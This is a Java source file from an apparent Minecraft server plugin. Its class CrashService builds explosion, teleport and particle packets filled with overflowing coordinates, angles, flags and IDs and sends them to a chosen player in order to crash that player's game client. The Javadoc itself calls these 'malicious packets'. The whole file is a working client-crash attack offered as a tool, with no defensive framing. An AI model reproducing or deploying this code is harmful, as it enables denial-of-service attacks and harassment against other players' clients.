package cn.linmumua.mutool.module.crash;

import com.github.retrooper.packetevents.PacketEvents;
import com.github.retrooper.packetevents.protocol.particle.Particle;
import com.github.retrooper.packetevents.protocol.particle.type.ParticleTypes;
import com.github.retrooper.packetevents.util.Vector3d;
import com.github.retrooper.packetevents.util.Vector3f;
import com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerExplosion;
import com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerParticle;
import com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerPlayerPositionAndLook;
import org.bukkit.entity.Player;

import java.util.Collections;

/**
 * Sends malicious packets to a player's client to reproduce known client-side crash
 * packets. Faithful port of {@code MumuTools} {@code module_crash} {@code CrashService}.
 *
 * <p>Packets are dispatched through PacketEvents' player manager
 * ({@link PacketEvents#getAPI()} → {@code getPlayerManager().sendPacket(...)}), which is
 * provided at runtime by the PacketEvents plugin via {@code paper-plugin.yml}'s
 * {@code join-classpath}. Every wrapper used here exists verbatim in
 * {@code packetevents-api 2.12.1}.</p>
 */
public final class CrashService {

    /**
     * Crash the given player's client.
     *
     * @param player    the target player
     * @param crashType one of {@code explosion}, {@code invalid_teleport}, {@code invalid_particle}
     * @return {@code true} when the type is known and a packet was sent, {@code false} otherwise
     */
    public static boolean crashPlayerClient(Player player, String crashType) {
        switch (crashType) {
            case "explosion" -> PacketEvents.getAPI().getPlayerManager().sendPacket(
                    player,
                    new WrapperPlayServerExplosion(
                            new Vector3d(generateInvalidPosition(), generateInvalidPosition(), generateInvalidPosition()),
                            generateInvalidLook(),
                            Collections.emptyList(),
                            new Vector3f(generateInvalidLook(), generateInvalidLook(), generateInvalidLook())
                    )
            );
            case "invalid_teleport" -> PacketEvents.getAPI().getPlayerManager().sendPacket(
                    player,
                    new WrapperPlayServerPlayerPositionAndLook(
                            generateInvalidPosition(), generateInvalidPosition(), generateInvalidPosition(),
                            generateInvalidLook(), generateInvalidLook(),
                            generateFlags(), generateTeleportID(), false
                    )
            );
            case "invalid_particle" -> PacketEvents.getAPI().getPlayerManager().sendPacket(
                    player,
                    new WrapperPlayServerParticle(
                            new Particle<>(ParticleTypes.DRAGON_BREATH), true,
                            new Vector3d(generateInvalidPosition(), generateInvalidPosition(), generateInvalidPosition()),
                            new Vector3f(generateInvalidLook(), generateInvalidLook(), generateInvalidLook()),
                            generateInvalidLook(), generateTeleportID()
                    )
            );
            default -> {
                return false;
            }
        }
        return true;
    }

    /** Build an invalid coordinate (overflowing {@code double}). */
    private static double generateInvalidPosition() {
        double baseValue = Double.MAX_VALUE;
        double randomFactor = Math.random();
        return baseValue * (randomFactor * (Math.sqrt(randomFactor) * 564.0 % 1.0 * 0.75 - Math.pow(randomFactor, 2.0) % 1.0 * 0.5) + 0.5);
    }

    /** Build an invalid look angle (overflowing {@code float}). */
    private static float generateInvalidLook() {
        float baseValue = Float.MAX_VALUE;
        double randomFactor = Math.random();
        return baseValue * (float) (randomFactor * (Math.sqrt(randomFactor) * 564.0 % 1.0 * 0.75 - Math.pow(randomFactor, 2.0) % 1.0 * 0.5) + 0.5);
    }

    /** Build an invalid flags byte. */
    private static byte generateFlags() {
        int maxValue = 127;
        double randomFactor = Math.random();
        return (byte) (maxValue * (randomFactor * (Math.sqrt(randomFactor) * 564.0 % 1.0 * 0.75 - Math.pow(randomFactor, 2.0) % 1.0 * 0.5) + 0.5));
    }

    /** Build an invalid teleport id. */
    private static int generateTeleportID() {
        int maxValue = Integer.MAX_VALUE;
        double randomFactor = Math.random();
        return (int) (maxValue * (randomFactor * (Math.sqrt(randomFactor) * 564.0 % 1.0 * 0.75 - Math.pow(randomFactor, 2.0) % 1.0 * 0.5) + 0.5));
    }

    private CrashService() {
    }
}
